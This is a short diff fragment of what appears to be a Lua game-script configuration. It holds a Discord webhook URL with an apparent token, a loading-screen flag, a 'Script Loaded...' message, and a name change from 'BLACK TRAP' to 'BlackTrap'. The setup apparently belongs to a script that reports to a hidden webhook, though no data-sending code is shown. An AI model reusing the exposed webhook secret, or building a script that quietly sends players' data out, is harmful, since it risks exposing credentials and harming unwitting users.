@@ -4,7 +4,7 @@ WebHook = "https://discord.com/api/webhooks/1097499373975375892/togatmEKsVrg3yJL
  
 loadingscreen = true
  
-_G.CustomScriptName = "BLACK TRAP"
+_G.CustomScriptName = "BlackTrap"
  
 _G.Text1 = "Script Loaded..."
  
